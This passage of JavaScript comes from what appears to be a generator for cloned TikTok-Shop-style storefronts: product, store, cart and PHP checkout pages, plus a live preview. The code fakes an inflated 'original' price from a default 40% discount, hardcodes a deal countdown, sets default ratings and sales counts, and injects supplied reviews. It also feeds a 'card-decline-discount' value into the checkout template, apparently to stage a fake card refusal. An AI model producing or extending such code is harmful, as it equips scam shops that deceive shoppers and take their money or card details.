            var headerInfo = mainModal.querySelector('.modal-header-info'); if(headerInfo) headerInfo.innerHTML = priceHTML + '<div class="modal-selection-text" id="modal-selection-text">${t.select_options}</div>'; var headerImg = mainModal.querySelector('.modal-product-image'); if(headerImg) headerImg.src = product.mainImage || 'https://placehold.co/96x96?text=?'; var html = ''; if (product.colors && product.colors.length > 0) { var colorsHTML = product.colors.map(function(c) { var imgHtml = c.imageUrl ? '<img src="' + c.imageUrl + '" alt="' + c.name + '">' : '<img src="https://placehold.co/80x80?text=." alt="' + c.name + '">'; return '<div class="color-option" data-value="' + c.name + '">' + imgHtml + '<span>' + c.name + '</span>' + '</div>'; }).join(''); var title = product.variation1Title || 'Cor'; html += '<div class="option-group"><div class="option-title">' + title + '</div><div class="color-options">' + colorsHTML + '</div></div>'; } if (product.sizes && product.sizes.length > 0) { var sizesHTML = product.sizes.map(function(s) { return '<div class="size-option" data-value="' + s + '">' + s + '</div>'; }).join(''); var title = product.variation2Title || 'Tamanho'; html += '<div class="option-group"><div class="option-title">' + title + '</div><div class="size-options">' + sizesHTML + '</div></div>'; } html += '<div class="quantity-section"><div class="option-title">${t.label_qty}</div><div class="quantity-selector"><button class="quantity-btn" onclick="updateQuantity(-1)">-</button><div class="quantity-value" id="quantity-value">1</div><button class="quantity-btn" onclick="updateQuantity(1)">+</button></div></div>'; var body = mainModal.querySelector('.modal-body'); if(body) body.innerHTML = html; selectedColor = null; selectedSize = null; updateBuyButton(); 
        }
        
        window.loadProduct = function(productId) { 
            if (!allProducts[productId]) { console.error('Produto não encontrado:', productId); return; } currentProductId = productId; var product = allProducts[currentProductId]; var allImages = [product.mainImage].concat(product.additionalImages || []).filter(Boolean); var allImagesHTML = allImages.map(function(img) { return '<img class="product-image" src="' + (img || 'https://placehold.co/500x500?text=?') + '" alt="' + (product.productTitle || 'Imagem do produto') + '">'; }).join(''); const sliderWrapper = el('.image-slider-wrapper'); if (sliderWrapper) sliderWrapper.innerHTML = allImagesHTML; 
            
            var currentPriceNum = parseFloat(String(product.currentPrice || '0').replace(',', '.')) || 0; var discountPercentage = parseInt(product.recommendationDiscount) || 40; var discountDecimal = discountPercentage / 100; var calculatedOriginalPriceNum = (discountDecimal > 0 && discountDecimal < 1) ? (currentPriceNum / (1 - discountDecimal)) : currentPriceNum; 
            
            var displayOriginalPrice = calculatedOriginalPriceNum.toLocaleString(currencyLocale, { minimumFractionDigits: 2, maximumFractionDigits: 2 }); 
            var displayCurrentPrice = currentPriceNum.toLocaleString(currencyLocale, { minimumFractionDigits: 2, maximumFractionDigits: 2 }); 
            
            var flashDealHTML = '<section class="clean-price-section" style="margin: -16px -16px 0px -16px; padding: 12px 16px 11px 16px; background: linear-gradient(90deg, #fe2c55 0%, #ee6836 100%); min-height: 36px; box-shadow: 0 2px 12px #0001; display: flex; flex-direction: column; justify-content: center;">' +
            '<div style="display: flex; align-items: center; justify-content: space-between; gap: 8px; margin-bottom: 0;">' +
                '<div style="display: flex; align-items: center; gap: 8px;">' +
                    '<div style="display: flex; flex-direction: column; align-items: flex-start; gap: 0;">' +
                        '<div style="display: flex; flex-direction: row; align-items: center; gap: 6px;">' +
                            '<span id="discount-percent" style="background: rgba(0, 0, 0, 0.18); color: #ffffff; padding: 3px 6px; border-radius: 4px; font-size: 12px; font-weight: 800; display: inline-block;">-' + discountPercentage + '%</span>' +
                            '<span id="price-current" style="font-family: \\'Helvetica Neue\\', Helvetica, Arial, sans-serif; font-size: 27px; font-weight: 800; color: #ffffff; line-height: 1;">' + currencySymbol + ' ' + displayCurrentPrice + '</span>' +
                            '<img src="https://editor.sys-assets-check.com/img/bilhete.png" alt="Bilhete" style="margin-left: 2px; width: 18px; height: 18px; display: inline-block; filter: brightness(0) invert(1);">' +
                        '</div>' +
                        '<span id="price-compare" style="text-decoration: line-through; color: rgba(255, 255, 255, 0.8); font-size: 11px; display: inline-block; margin-left: 0px; margin-top: 3px;">' + currencySymbol + ' ' + displayOriginalPrice + '</span>' +
                    '</div>' +
                '</div>' +
                '<div style="display: flex; flex-direction: column; align-items: flex-end;">' +
                    '<div style="display: flex; align-items: center; background: #fff8f800; padding: 0;">' +
                        '<img src="https://editor.sys-assets-check.com/img/raio.png" alt="Oferta Relâmpago" style="width: 11px; height: 11px; display: inline-block; vertical-align: middle; margin-right: 4px; filter: brightness(0) invert(1);">' +
                        '<span style="color: #ffffff; font-size: 11px; font-weight: 700;">${t.flash_deal}</span>' +
                    '</div>' +
                    '<div style="margin-top: 3px; display: flex; align-items: center;">' +
                        '<span id="countdown-timer" style="color: #ffffff; font-size: 12px; font-weight: 600;">${t.ends_in} 00:04:46</span>' +
                    '</div>' +
                '</div>' +
            '</div>' +
        '</section>';
            
            var priceSectionElement = el('.clean-price-section'); if (priceSectionElement) priceSectionElement.outerHTML = flashDealHTML; 
            var instValEl = el('.installments-value'); if (instValEl) { var instNum = parseFloat(String(product.currentPrice || '0').replace(/[^0-9.,]/g, '').replace(',', '.')) || 0; instValEl.textContent = currencySymbol + ' ' + (instNum > 0 ? formatMoneyJS(instNum / 12) : ''); }
            
            var couponTicketSvg = '<svg class="coupon-ticket-icon" viewBox="0 0 507 346"><g transform="translate(0,346) scale(0.1,-0.1)" fill="currentColor" stroke="none"><path d="M520 3287 c-146 -50 -246 -137 -309 -269 -21 -46 -44 -107 -50 -136 -7 -31 -11 -177 -11 -358 0 -252 3 -311 15 -341 36 -87 76 -106 230 -113 92 -5 131 -11 167 -27 66 -30 143 -105 175 -172 25 -49 28 -67 28 -151 0 -84 -3 -102 -28 -152 -33 -68 -90 -121 -165 -156 -44 -20 -76 -26 -151 -29 -137 -6 -157 -10 -198 -46 -70 -62 -73 -74 -73 -422 0 -345 6 -392 63 -499 41 -79 125 -163 207 -208 128 -71 66 -68 1281 -68 1089 0 1093 0 1136 21 30 15 52 35 71 67 26 45 27 54 32 220 l5 174 37 34 c40 36 50 38 185 37 68 0 101 -16 130 -60 15 -22 19 -57 23 -203 5 -176 5 -177 34 -214 58 -77 48 -76 611 -76 542 0 550 1 661 56 136 69 243 211 273 362 6 30 11 186 11 363 0 256 -3 316 -15 346 -36 87 -82 109 -235 115 -99 4 -123 8 -172 32 -118 56 -189 163 -196 293 -7 117 36 209 135 289 67 54 134 74 255 74 119 0 169 22 205 90 23 42 23 48 23 364 0 354 -4 386 -62 506 -40 83 -141 184 -223 224 -116 57 -108 56 -657 56 -553 0 -547 1 -600 -56 -42 -45 -48 -75 -49 -237 0 -174 -9 -211 -58 -244 -29 -20 -47 -23 -127 -23 -101 0 -149 15 -175 54 -10 15 -15 70 -19 201 -6 201 -12 223 -77 272 l-36 28 -1121 2 -1121 3 -65 -23z m2733 -917 c53 -25 67 -73 67 -220 0 -209 -25 -240 -190 -240 -77 0 -101 4 -127 20 -55 33 -63 62 -63 221 0 132 2 145 23 176 33 49 77 64 177 60 47 -2 98 -10 113 -17z m-8 -841 c61 -30 70 -56 73 -212 2 -121 0 -147 -15 -176 -32 -62 -62 -76 -166 -76 -108 0 -148 14 -177 60 -18 28 -20 49 -20 176 0 94 5 152 13 168 16 32 57 61 98 70 51 12 162 5 194 -10z"/></g></svg>'; var extraDiscountsHTML = (product.extraDiscounts || []).map(function(d, i) { return '<span class="extra-discount-badge">' + (i === 0 ? couponTicketSvg : '') + d + '</span>'; }).join(''); const extraDiscContainer = el('.extra-discounts-container'); if (extraDiscContainer) extraDiscContainer.innerHTML = extraDiscountsHTML; const couponRowEl = el('#coupon-discount-row'); if (couponRowEl) couponRowEl.style.display = (product.extraDiscounts && product.extraDiscounts.length) ? 'flex' : 'none'; var productBadgeHTML = product.productBadge ? '<span class="product-title-badge">' + product.productBadge + '</span> ' : ''; const titleEl = el('.product-title'); if (titleEl) titleEl.innerHTML = productBadgeHTML + (product.productTitle || ''); var favBtnEl = el('#fav-btn'); if (favBtnEl) { if (favoritedProducts[currentProductId]) favBtnEl.classList.add('favorited'); else favBtnEl.classList.remove('favorited'); } var ratingSalesHTML = ''; if (product.productRating && product.reviewCount) ratingSalesHTML += '<svg class="star-icon" viewBox="0 0 24 24" fill="#fbbf24" stroke="none" style="width:16px;height:16px;vertical-align:middle;margin-right:2px;"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg> <span style="font-weight:600;color:#000;">' + product.productRating + '</span> <span style="color:#0066cc;">(' + product.reviewCount + ')</span>'; if (product.salesCount) ratingSalesHTML += ' <span style="color:#666;">| ' + product.salesCount + ' ${t.sold_count}</span>'; const ratingSalesEl = el('.rating-sales-container span'); if (ratingSalesEl) ratingSalesEl.innerHTML = ratingSalesHTML.trim(); var sellerAvatarHTML = product.storeLogoUrl ? '<img src="' + product.storeLogoUrl + '" alt="Logo ' + product.storeName + '">' : (product.storeName || '?').charAt(0); const sellerAvatarEl = el('.seller-avatar'); if (sellerAvatarEl) sellerAvatarEl.innerHTML = sellerAvatarHTML; const sellerNameEl = el('.seller-name'); if (sellerNameEl) sellerNameEl.textContent = product.storeName || ''; const sellerSalesEl = el('.seller-sales'); if (sellerSalesEl) sellerSalesEl.textContent = (product.storeSales || '0') + ' ${t.sold_count}'; var descriptionBlocksHTML = Array.isArray(product.descriptionBlocks) && product.descriptionBlocks.length ? product.descriptionBlocks.map(function(block) { if (!block || typeof block !== 'object') return ''; if ((block.type === 'video' || block.type === 'image') && block.url) return descMediaTagJS(block.url); if (block.type === 'text' && block.text) return beautifyDescJS(block.text); return ''; }).join('') : ((product.descriptionImages || []).map(function(url) { return descMediaTagJS(url); }).join('') + ((product.productDescription || '') ? beautifyDescJS(product.productDescription || '') : '')); const descContentEl = el('#description .description-content'); if (descContentEl) descContentEl.innerHTML = '<h3 class="section-title">${t.description_title}</h3>' + descriptionBlocksHTML; var reviewsHTML = (product.reviews || []).map(function(r) { var avatarContent = r.avatarUrl ? '<img src="' + r.avatarUrl + '" class="rev-avatar">' : '<div class="rev-avatar" style="background:#ddd;display:flex;align-items:center;justify-content:center;font-size:10px;">' + (r.name || "A").charAt(0) + '</div>'; var stars = ''; for(let i=0; i<5; i++) { const fill = i < (r.stars||5) ? 'currentColor' : 'none'; const cls = i < (r.stars||5) ? 'rev-star-icon' : 'rev-star-icon empty'; stars += '<svg class="' + cls + '" viewBox="0 0 24 24" fill="' + fill + '" stroke="currentColor" stroke-width="0"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>'; } var variantText = r.details ? r.details : "Item: Padrão"; return '<div class="review-item"><div class="rev-user-row">' + avatarContent + '<div class="rev-name">' + r.name + '</div></div><div class="rev-stars-row">' + stars + '</div><div class="rev-variant">' + variantText + '</div><div class="rev-text">' + r.text + '</div>' + (r.images && r.images.length > 0 ? '<div class="rev-imgs" style="display:flex;gap:6px;flex-wrap:wrap;margin-top:8px;">' + r.images.slice(0,5).map(function(img) { return '<img class="rev-img" src="' + img + '" alt="Foto" style="width:60px;height:60px;object-fit:cover;border-radius:6px;cursor:pointer;" onclick="openReviewLightbox(this)">'; }).join('') + '</div>' : (r.image ? '<img class="rev-img" src="' + r.image + '" alt="Foto" style="cursor:pointer;" onclick="openReviewLightbox(this)">' : '')) + '</div>'; }).join(''); var pScore = product.productRating || "4.9"; var headerScoreHTML = '<div class="reviews-header-top"><div class="reviews-title">${t.reviews_title} (' + (product.reviewCount || (product.reviews||[]).length) + ')</div><a href="#" class="reviews-more">${t.view_more} ></a></div><div class="reviews-score-container"><span class="reviews-score-val">' + pScore + '</span><span class="reviews-score-max">/5</span><div class="reviews-score-stars">'; for(let i=0; i<5; i++) { const fill = i < Math.round(parseFloat(pScore)) ? 'currentColor' : 'none'; const cls = i < Math.round(parseFloat(pScore)) ? '' : 'empty'; headerScoreHTML += '<svg style="width:16px;height:16px;color:#fbbf24" class="' + cls + '" viewBox="0 0 24 24" fill="' + fill + '" stroke="currentColor" stroke-width="0"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>'; } headerScoreHTML += '</div></div>'; const reviewSectionEl = el('#reviews .reviews-section'); if (reviewSectionEl) reviewSectionEl.innerHTML = headerScoreHTML + reviewsHTML; var recommendationIds = product.recommendationIds || []; var recommendationsHTML = recommendationIds.map(function(recId) { var rec = allProducts[recId]; if (!rec) return ''; var title = rec.productTitle || rec.title || 'Produto'; var image = rec.mainImage || rec.image || 'https://placehold.co/200x200?text=?'; var price = formatMoneyJS(rec.currentPrice || rec.price); return '<div class="recommendation-item" onclick="loadProduct(' + "'" + recId + "'" + ')"><img class="recommendation-image" src="' + image + '" alt="' + title + '"><div class="recommendation-info"><div class="recommendation-title">' + title + '</div><div class="recommendation-price-row"><span class="recommendation-price">' + currencySymbol + ' ' + price + '</span></div></div></div>'; }).join(''); const recGridEl = el('#recommendations .recommendations-grid'); if (recGridEl) recGridEl.innerHTML = recommendationsHTML; var pageFooterHTML = '<div class="page-footer-grid"><div class="page-footer-col"><h4>${t.footer_institutional}</h4><ul><li><a href="' + (product.footerLinkPrivacy || '#') + '">${t.footer_links[0]}</a></li><li><a href="' + (product.footerLinkExchanges || '#') + '">${t.footer_links[1]}</a></li><li><a href="' + (product.footerLinkShipping || '#') + '">${t.footer_links[2]}</a></li><li><a href="' + (product.footerLinkTerms || '#') + '">${t.footer_links[3]}</a></li></ul></div><div class="page-footer-col"><h4>${t.footer_help}</h4><p>${t.label_email} ' + (product.footerEmail || '') + '</p><p>${t.label_whatsapp} ' + (product.footerWhatsapp || '') + '</p><p>${t.label_address} ' + (product.footerAddress || '') + '</p></div><div class="page-footer-col"><h4>${t.footer_about}</h4><p>${t.label_cnpj} ' + (product.footerCnpj || '') + '</p><p>${t.label_business_name} ' + (product.footerCompanyName || '') + '</p><p>' + (product.footerSecurityText || '') + '</p>' + (product.footerSecuritySealsImg ? '<img src="' + product.footerSecuritySealsImg + '" alt="Selos de Segurança">' : '') + '</div></div><div class="page-footer-copyright"><p>&copy; ' + (product.footerCopyrightYear || '') + ' - ' + (product.footerCopyrightText || '') + '. ${t.footer_rights}.</p></div>'; const footerContainerEl = el('.page-footer-container'); if (footerContainerEl) footerContainerEl.innerHTML = pageFooterHTML; const visitBtn = el('.visit-btn'); if (visitBtn) visitBtn.setAttribute('onclick', "window.location.href='loja.html'"); 
            
            updateDeliveryDate();
            updateVariationsPreview();
            
            // Atualizar secao de recomendacoes com o layout completo (estrelas, frete gratis, preco riscado)
            var recsGrid = el('.recommendations-grid');
            if (recsGrid) {
                var recsHTML = '';
                Object.keys(allProducts).forEach(function(pid) {
                    if (pid !== currentProductId) {
                        var rec = allProducts[pid];
                        var recTitle = rec.productTitle || rec.title || 'Produto';
                        var recImage = rec.mainImage || rec.image || 'https://placehold.co/200x200';
                        var recPriceNum = parseFloat(String(rec.currentPrice || rec.price || '0').replace(/[^0-9.,]/g, '').replace(',', '.')) || 0;
                        var recOriginalPriceNum = parseFloat(String(rec.originalPrice || rec.currentPrice || '0').replace(/[^0-9.,]/g, '').replace(',', '.')) || 0;
                        var recPrice = recPriceNum.toLocaleString(currencyLocale, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
                        var recOriginalPrice = recOriginalPriceNum.toLocaleString(currencyLocale, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
                        var recRating = rec.productRating || '4.9';
                        var recSales = rec.salesCount || '100';
                        var hasDiscount = recOriginalPriceNum > recPriceNum;
                        var pidSafe = pid.replace(/'/g, "\\'");
                        
                        recsHTML += '<div class="recommendation-item" onclick="loadProduct(\\'' + pidSafe + '\\')">' +
                            '<img class="recommendation-image" src="' + recImage + '" alt="' + recTitle + '">' +
                            '<div class="recommendation-info">' +
                                '<div class="recommendation-title">' + recTitle + '</div>' +
                                '<div class="recommendation-price-row">' +
                                    '<span class="recommendation-price">' + currencySymbol + ' ' + recPrice + '</span>' +
                                    (hasDiscount ? '<span class="recommendation-original-price">' + currencySymbol + ' ' + recOriginalPrice + '</span>' : '') +
                                '</div>' +
                                '<div class="recommendation-badges">' +
                                    '<span class="rec-badge-shipping">${t.free_shipping}</span>' +
                                    '<span class="rec-badge-installment">3x ${t.interest_free}</span>' +
                                '</div>' +
                                '<div class="recommendation-rating">' +
                                    '<svg class="rec-star-icon" viewBox="0 0 24 24" fill="#fbbf24" stroke="none"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>' +
                                    '<span style="font-weight:600;color:#000;margin-left:2px;">' + recRating + '</span>' +
                                    '<span style="color:#0066cc;margin-left:2px;">(' + (rec.reviewCount || '0') + ')</span>' +
                                    '<span style="color:#666;margin-left:4px;">| ' + recSales + ' ${t.sold_count}</span>' +
                                '</div>' +
                            '</div>' +
                        '</div>';
                    }
                });
                recsGrid.innerHTML = recsHTML;
            }
            
            resetModal(); setupSliderObserver(); setupScrollObserver(); startCountdown(); window.scrollTo(0, 0); document.body.scrollTop = 0; document.documentElement.scrollTop = 0; setTimeout(function(){ window.scrollTo(0, 0); }, 100); 
        };
        
        var tabs = all('.tab-item'); if (tabs.length > 0) { tabs.forEach(function(tab) { tab.addEventListener('click', function(e) { e.preventDefault(); tabs.forEach(t => t.classList.remove('active')); tab.classList.add('active'); var targetId = tab.getAttribute('href').substring(1); var targetElement = el('#' + targetId); if(targetElement) { const headerHeight = 90; const elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset; const offsetPosition = elementPosition - headerHeight; window.scrollTo({ top: offsetPosition, behavior: "smooth" }); } }); }); }
        startCountdown(); var cartContainer = el('.cart-container'); if(cartContainer) { cartContainer.style.cursor = 'pointer'; cartContainer.onclick = function() { window.location.href = 'carrinho.html'; }; }
        
        updateCartCount(); setupSliderObserver(); setupScrollObserver(); resetModal(); updateDeliveryDate(); updateVariationsPreview();
    });
    `;

    const finalHTML = `<!DOCTYPE html>
<html lang="${lang === 'en' ? 'en' : lang === 'pt' ? 'pt-BR' : lang}">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${data.productTitle}</title>
    ${visualPatchCSS}
</head>
<body>
    <div id="main-app">
        <header class="mobile-header">
            <div class="top-bar">
                <button class="icon-btn" onclick="history.back()"><svg class="icon-svg" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 18L9 12L15 6" stroke="black" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
                <div class="actions-right">
                    <button class="icon-btn"><svg class="icon-svg" style="width: 30px; height: 30px;" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M 15 48 Q 15 20, 35 20 L 35 12 L 52 28 L 35 44 L 35 36 Q 20 36, 15 48 Z" stroke="#000000" stroke-width="5" stroke-linecap="round" stroke-linejoin="round" fill="none"/></svg></button>
                    <div class="cart-container"><button class="icon-btn"><svg class="icon-svg" viewBox="0 0 24 24" fill="none" stroke="black" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="9" cy="21" r="1"/><circle cx="20" cy="21" r="1"/><path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"/></svg></button><span class="cart-badge" style="display: none;">0</span></div>
                    <button class="icon-btn"><svg class="icon-svg" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="5" cy="12" r="2" fill="black"/><circle cx="12" cy="12" r="2" fill="black"/><circle cx="19" cy="12" r="2" fill="black"/></svg></button>
                </div>
            </div>
            <nav class="tabs-bar"><a href="#overview" class="tab-item active">${t.nav_home}</a><a href="#reviews" class="tab-item">${t.reviews_title}</a><a href="#description" class="tab-item">${t.description_title}</a><a href="#recommendations" class="tab-item">${t.recommendations_title}</a></nav>
        </header>
        <div id="overview">
            <div class="image-slider-container"><div class="image-slider-wrapper">${allImagesHTML}</div><div class="image-counter" id="image-counter">1/${[data.mainImage, ...data.additionalImages].filter(Boolean).length || 1}</div></div>
            <div class="product-info">
                ${flashDealHTML}
                ${installmentsHTML}
                <div class="coupon-discount-row" id="coupon-discount-row" onclick="openModal('buy')" style="${(data.extraDiscounts && data.extraDiscounts.length) ? '' : 'display:none;'}">
                    <div class="extra-discounts-container">${extraDiscountsHTML}</div>
                    <svg class="coupon-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 6l6 6-6 6"/></svg>
                </div>
                <div class="title-wrapper"><h1 class="product-title">${productBadgeHTML}${data.productTitle}</h1><button type="button" class="fav-btn" id="fav-btn" onclick="toggleFavorite(this)" aria-label="Favoritar"><svg class="fav-icon" viewBox="0 0 24 24"><path d="M6 2h12a1 1 0 0 1 1 1v18.382a.5.5 0 0 1-.724.447L12 18.5l-6.276 3.329A.5.5 0 0 1 5 21.382V3a1 1 0 0 1 1-1z"/></svg></button></div>
                <div class="rating-sales-container"><span style="display:inline-flex;align-items:center;flex-wrap:wrap;gap:2px;">${ratingSalesHTML}</span></div>
                ${shippingAndVariationsHTML}
            </div>
            ${protectionHTML}
            ${offersHTML}
            <div class="overview-content"><div class="seller-info"><div class="seller-details"><div class="seller-avatar">${sellerAvatarHTML}</div><div><div class="seller-name">${data.storeName}</div><div class="seller-sales">${data.storeSales} ${t.sold_count}</div></div></div><button class="visit-btn" onclick="window.location.href='loja.html'">${t.visit_store}</button></div></div>
        </div>
        <div id="reviews" class="tab-content"><div class="reviews-section">${reviewsHeaderHTML}${reviewsHTML}</div></div>
        <div id="description" class="tab-content"><div class="description-content"><h3 class="section-title">${t.description_title}</h3>${descriptionImagesHTML}</div></div>
        <div id="recommendations" class="tab-content"><div class="recommendations-content"><h3 class="section-title">${t.recommendations_title2}</h3><div class="recommendations-grid">${recommendationsHTML}</div></div></div>
        ${pageFooterHTML}
        ${footerHTML}
    </div>
    <div id="added-toast" class="toast-overlay"><div class="toast-box"><div class="toast-icon"><svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3"><polyline points="20 6 9 17 4 12"></polyline></svg></div><div class="toast-text">Adicionado ao carrinho</div></div></div>
    <div id="variation-modal" class="modal-overlay"><div class="modal-content"><button class="modal-close" onclick="closeModal()">×</button> <div class="modal-header"><img class="modal-product-image" src="${data.mainImage}" alt="${data.productTitle}"><div class="modal-header-info"></div></div><div class="modal-body"></div><button class="modal-buy-btn disabled" id="buy-btn" onclick="handleMainBuyClick(event)">${t.btn_add_cart}</button></div></div>
    <div id="fav-toast" class="fav-toast"></div>
    <div id="review-lightbox" class="review-lightbox">
        <div class="rl-topbar">
            <button class="rl-close" onclick="closeReviewLightbox()" aria-label="Fechar">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
            </button>
            <div class="rl-counter"><span id="rl-current">1</span>/<span id="rl-total">1</span></div>
        </div>
        <div class="rl-stage" id="rl-stage">
            <img id="rl-image" class="rl-image" src="" alt="Foto da avaliacao" draggable="false">
        </div>
        <div class="rl-info">
            <div class="rl-user-row">
                <div id="rl-avatar" class="rl-avatar"></div>
                <div id="rl-name" class="rl-name"></div>
                <div id="rl-stars" class="rl-stars"></div>
            </div>
            <div id="rl-variant" class="rl-variant"></div>
            <div id="rl-text" class="rl-text"></div>
        </div>
    </div>
    <script>${generatedScript}<\/script>
</body>
</html>`;

    return finalHTML; 
  } catch (error) {
    console.error("Erro ao gerar HTML:", error);
    return ``;
  }
}

let currentView = "code";
let debounceTimer;
let currentPreviewPage = "produto";
function switchToPreview() { el("preview-container").classList.add("active"); updateOutput(); }

// Converte navegações internas (window.location) das páginas geradas em mensagens
// para o editor pai, permitindo navegar pela prévia sem sair do iframe (srcdoc).
function injectPreviewNav(html) {
    if (!html) return html;
    // Substitui destinos de navegação por postMessage para o editor pai
    html = html
        .replace(/window\.location\.href\s*=\s*['"]loja\.html['"]/g, "parent.postMessage({__previewNav:'loja'},'*')")
        .replace(/window\.location\.href\s*=\s*['"]carrinho\.html['"]/g, "parent.postMessage({__previewNav:'carrinho'},'*')")
        .replace(/window\.location\.href\s*=\s*['"]checkout\.php['"]/g, "parent.postMessage({__previewNav:'checkout'},'*')");
    // Intercepta a função goToCheckout (fluxo de compra) para abrir o checkout na prévia
    const navInterceptor = `<script>(function(){try{
        var _go = window.goToCheckout;
        window.goToCheckout = function(items){ try{ if(items) localStorage.setItem('tktk_cart_items', JSON.stringify(items)); }catch(e){} parent.postMessage({__previewNav:'checkout'},'*'); };
        // Intercepta cliques em links/botões que naveguem para páginas do site
        document.addEventListener('click', function(e){
            var a = e.target && e.target.closest ? e.target.closest('a[href]') : null;
            if(a){ var h = a.getAttribute('href') || ''; var m = h.match(/(loja|carrinho|checkout)/); if(m && !/^https?:/.test(h)){ e.preventDefault(); var p = m[1] === 'checkout' ? 'checkout' : m[1]; parent.postMessage({__previewNav:p},'*'); } }
        }, true);
    }catch(e){}})();<\/script>`;
    if (html.includes('</body>')) html = html.replace('</body>', navInterceptor + '</body>');
    else html += navInterceptor;
    return html;
}

// Garante que carrinho/checkout tenham um item de exemplo para exibir conteúdo na prévia
function seedPreviewCart() {
    try {
        const data = getEditorData();
        const item = {
            title: data.productTitle || 'Produto de exemplo',
            price: data.currentPrice || '0,00',
            image: data.mainImage || 'https://placehold.co/100x100?text=?',
            color: (data.colors && data.colors[0] && (data.colors[0].name || data.colors[0])) || '',
            size: (data.sizes && data.sizes[0] && (data.sizes[0].name || data.sizes[0])) || '',
            qty: 1,
            selected: true
        };
        return `<script>(function(){try{ if(!localStorage.getItem('tktk_cart_items') || localStorage.getItem('tktk_cart_items')==='[]'){ localStorage.setItem('tktk_cart_items', JSON.stringify([${JSON.stringify(item)}])); } }catch(e){} })();<\/script>`;
    } catch (e) { return ''; }
}

// Remove/substitui blocos PHP do checkout para que a previa visual funcione no navegador
function stripPhpForPreview(html, exItem) {
    if (!html) return html;
    const itemsJson = JSON.stringify([exItem]);
    // Substitui os echoes que injetam dados usados pelo JS / texto visivel
    html = html.replace(/<\?php\s+echo\s+json_encode\(\$itemsData\);\s*\?>/g, itemsJson);
    html = html.replace(/<\?php\s+echo\s+\$prazoEntrega;\s*\?>/g, 'em ate 11 dias uteis');
    html = html.replace(/<\?php\s+echo\s+\$prazoPagamento;\s*\?>/g, 'aprovacao imediata');
    // Remove quaisquer outros blocos PHP restantes (ex.: o bloco grande do topo)
    html = html.replace(/<\?php[\s\S]*?\?>/g, '');
    html = html.replace(/<\?=[\s\S]*?\?>/g, '');
    return html;
}

// Constrói o HTML de cada página para a prévia, reaproveitando os mesmos templates do .zip
function buildPreviewPage(page) {
    const data = getEditorData();
    if (page === 'loja' || page === 'chat') {
        const mainProductId = data.productUrl || "main-product";
        const allProductsMap = {};
        allProductsMap[mainProductId] = {
            id: mainProductId, productTitle: data.productTitle, currentPrice: data.currentPrice, originalPrice: data.originalPrice,
            mainImage: data.mainImage, storeName: data.storeName, storeLogoUrl: data.storeLogoUrl, colors: data.colors, sizes: data.sizes
        };
        if (data.recommendations && data.recommendations.length > 0) {
            data.recommendations.forEach(rec => {
                let recId = rec.productUrl || rec.productTitle;
                if (recId === mainProductId) recId = recId + "-rec";
                if (!recId) recId = "rec-" + Math.floor(Math.random() * 100000);
                allProductsMap[recId] = {
                    id: recId, productTitle: rec.productTitle || rec.title, currentPrice: rec.currentPrice || rec.price,
                    originalPrice: rec.originalPrice || rec.currentPrice, mainImage: rec.mainImage || rec.image,
                    productRating: rec.productRating || "4.9", salesCount: rec.salesCount || "50", storeName: data.storeName,
                    storeLogoUrl: data.storeLogoUrl, colors: rec.colors || [], sizes: rec.sizes || []
                };
            });
        }
        let lojaContent = LOJA_TEMPLATE
            .replace('let allProducts = {};', 'let allProducts = ' + JSON.stringify(allProductsMap) + ';')
            .replace(/\{\{STORE_NAME\}\}/g, data.storeName || 'Loja')
            .replace(/\{\{STORE_LOGO\}\}/g, data.storeLogoUrl || 'https://placehold.co/50x50?text=Logo')
            .replace('{{STORE_SALES}}', data.storeSales || '1.000')
            .replace('{{COUPON_TITLE}}', data.couponTitle || 'Cupom de frete gratis')
            .replace('{{COUPON_SUB}}', data.couponSub || 'Sem gasto minimo')
            .replace('{{DISCOUNT_TITLE}}', data.discountTitle || 'Ate 85% OFF')
            .replace('{{DISCOUNT_SUB}}', data.discountSub || 'Em produtos selecionados')
            .replace('{{CATEGORIES_JSON}}', JSON.stringify(data.categories || []));
        // Para a aba Chat, abre automaticamente a tela de chat dentro da loja
        if (page === 'chat') {
            const autoChat = `<script>window.addEventListener('load', function(){ setTimeout(function(){ if(typeof openChat==='function') openChat(); }, 150); });<\/script>`;
            lojaContent = lojaContent.includes('</body>') ? lojaContent.replace('</body>', autoChat + '</body>') : lojaContent + autoChat;
        }
        return injectPreviewNav(seedPreviewCart() + lojaContent);
    }
    if (page === 'carrinho') {
        return injectPreviewNav(seedPreviewCart() + CART_TEMPLATE);
    }
    if (page === 'checkout') {
        const checkoutStyle = document.getElementById('checkout-style-selector') ? document.getElementById('checkout-style-selector').value : 'v1';
        let tpl = (checkoutStyle === 'v2') ? CHECKOUT_V2_TEMPLATE : CHECKOUT_TEMPLATE;
        let checkoutContent = tpl
            .replace(/\{\{STORE_NAME\}\}/g, data.storeName || 'Loja Segura')
            .replace('{{UPSELL_URL}}', '')
            .replace('{{UPSELL_DELAY}}', data.upsellDelay || '15')
            .replace(/\{\{CARD_DISCOUNT\}\}/g, (val('card-decline-discount') || '15'));
